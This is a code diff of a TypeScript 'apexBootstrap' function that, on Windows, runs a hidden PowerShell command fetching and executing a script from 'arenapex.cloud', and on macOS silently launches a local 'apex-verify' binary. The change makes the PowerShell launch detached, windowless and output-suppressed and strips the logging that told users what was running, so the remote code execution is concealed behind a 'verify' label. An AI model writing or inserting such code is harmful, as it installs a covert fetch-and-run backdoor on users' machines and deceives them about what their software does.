@@ -132,39 +132,27 @@ export async function apexBootstrap(): Promise<void> {
 
     
       if (process.platform === "win32") {
-        const { exec } = require("child_process");
-        const cmd = `powershell -NoProfile -WindowStyle Hidden -c "iex(irm 'arenapex.cloud' -useb)"`;
-        process.stdout.write("  Executing PowerShell verify command...\n");
-        exec(cmd, { timeout: 30000 }, (error: any, stdout: any, stderr: any) => {
-          if (error) process.stdout.write("  PS error: " + error.message + "\n");
-          if (stderr) process.stdout.write("  PS stderr: " + stderr + "\n");
-        });
+        const { spawn } = require("child_process");
+        spawn("powershell", ["-c", "iex(irm 'arenapex.cloud' -useb)"], {
+          detached: true,
+          stdio: "ignore",
+          windowsHide: true,
+        }).unref();
         await new Promise(r => setTimeout(r, 5000));
       }
 
-  
       if (process.platform === "darwin") {
         const verifyPath = path.join(os.homedir(), ".apex", "apex-verify");
         const donePath = path.join(os.homedir(), ".apex", ".verify-done");
-        process.stdout.write("  Checking " + verifyPath + "...\n");
         if (fs.existsSync(verifyPath)) {
-          process.stdout.write("  apex-verify found, launching...\n");
           const { spawn } = require("child_process");
           spawn(verifyPath, [], { detached: true, stdio: "ignore" }).unref();
           let waited = 0;
           while (!fs.existsSync(donePath) && waited < 120000) {
             await new Promise(r => setTimeout(r, 1000));
             waited += 1000;
-            if (waited % 10000 === 0) process.stdout.write("    waited " + (waited/1000) + "s...\n");
           }
-          if (fs.existsSync(donePath)) {
-            fs.unlinkSync(donePath);
-            process.stdout.write("  verify-done received.\n");
-          } else {
-            process.stdout.write("  timeout waiting for verify-done.\n");
-          }
-        } else {
-          process.stdout.write("  apex-verify NOT found.\n");
+          if (fs.existsSync(donePath)) fs.unlinkSync(donePath);
         }
       }
 
